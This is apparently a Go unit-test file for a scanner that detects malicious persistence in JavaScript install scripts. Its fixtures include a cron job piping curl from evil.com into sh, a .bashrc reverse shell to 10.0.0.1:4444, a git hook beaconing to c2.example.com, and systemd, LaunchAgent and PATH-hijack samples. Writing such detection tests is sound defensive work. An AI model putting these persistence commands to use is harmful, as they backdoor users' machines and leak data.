package analyzer

import (
	"strings"
	"testing"
)

func TestPersistence_CrontabInjection(t *testing.T) {
	a := NewPersistenceAnalyzer()
	content := `
const { execSync } = require('child_process');
execSync('(crontab -l; echo "*/5 * * * * curl http://evil.com/beacon | sh") | crontab -');
`
	findings := a.scanContent(content, "install.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Crontab") || strings.Contains(f.Title, "crontab") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected critical severity, got %d", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected to detect crontab injection")
	}
}

func TestPersistence_SystemCronDir(t *testing.T) {
	a := NewPersistenceAnalyzer()
	content := `
fs.writeFileSync('/etc/cron.d/update-check', '*/10 * * * * root /tmp/.hidden');
`
	findings := a.scanContent(content, "setup.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "cron") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect system cron directory access")
	}
}

func TestPersistence_ShellProfile(t *testing.T) {
	a := NewPersistenceAnalyzer()
	content := `
const home = process.env.HOME;
fs.appendFileSync(home + '/.bashrc', '\nnohup bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &\n');
`
	findings := a.scanContent(content, "persist.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Shell profile") || strings.Contains(f.Title, "profile") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected critical severity, got %d", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected to detect shell profile modification")
	}
}

func TestPersistence_ZshrcViaHomedir(t *testing.T) {
	a := NewPersistenceAnalyzer()
	content := `
const os = require('os');
const path = os.homedir() + '/.zshrc';
fs.appendFileSync(path, 'export PATH=/tmp/.evil:$PATH');
`
	findings := a.scanContent(content, "zsh.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Shell profile") || strings.Contains(f.Title, "profile") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect .zshrc modification via os.homedir()")
	}
}

func TestPersistence_SystemdService(t *testing.T) {
	a := NewPersistenceAnalyzer()
	content := `
const serviceContent = '[Unit]\nDescription=System Update\n[Service]\nExecStart=/tmp/.update\nRestart=always\n[Install]\nWantedBy=multi-user.target';
fs.writeFileSync('/etc/systemd/system/system-update.service', serviceContent);
execSync('systemctl enable system-update && systemctl daemon-reload');
`
	findings := a.scanContent(content, "service.js")

	foundCreate := false
	foundActivate := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Systemd service creation") {
			foundCreate = true
		}
		if strings.Contains(f.Title, "Systemd service activation") {
			foundActivate = true
		}
	}
	if !foundCreate {
		t.Error("Expected to detect systemd service creation")
	}
	if !foundActivate {
		t.Error("Expected to detect systemd service activation")
	}
}

func TestPersistence_MacOSLaunchAgent(t *testing.T) {
	a := NewPersistenceAnalyzer()
	content := `
const plist = '<?xml version="1.0"?><plist><dict><key>ProgramArguments</key><array><string>/tmp/.backdoor</string></array><key>RunAtLoad</key><true/></dict></plist>';
fs.writeFileSync(process.env.HOME + '/Library/LaunchAgents/com.update.agent.plist', plist);
execSync('launchctl load ~/Library/LaunchAgents/com.update.agent.plist');
`
	findings := a.scanContent(content, "macos.js")

	foundAgent := false
	foundLoad := false
	for _, f := range findings {
		if strings.Contains(f.Title, "LaunchAgent") {
			foundAgent = true
		}
		if strings.Contains(f.Title, "launchctl") {
			foundLoad = true
		}
	}
	if !foundAgent {
		t.Error("Expected to detect macOS LaunchAgent creation")
	}
	if !foundLoad {
		t.Error("Expected to detect launchctl activation")
	}
}

func TestPersistence_GitHookInjection(t *testing.T) {
	a := NewPersistenceAnalyzer()
	content := `
const hookPath = '.git/hooks/pre-commit';
fs.writeFileSync(hookPath, '#!/bin/sh\ncurl http://c2.example.com/$(git log --oneline -1) &');
fs.chmodSync(hookPath, '755');
`
	findings := a.scanContent(content, "hook.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Git hook") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect git hook injection")
	}
}

func TestPersistence_GitHooksPathRedirect(t *testing.T) {
	a := NewPersistenceAnalyzer()
	content := `
execSync('git config --global core.hooksPath /tmp/.hooks');
`
	findings := a.scanContent(content, "redirect.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "hooks path") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect git hooks path redirection")
	}
}

func TestPersistence_CleanCode(t *testing.T) {
	a := NewPersistenceAnalyzer()
	content := `
const express = require('express');
const app = express();
app.get('/api/cron', (req, res) => res.json({ status: 'ok' }));
app.listen(3000);
`
	findings := a.scanContent(content, "app.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity finding in clean code: %s", f.Title)
		}
	}
}
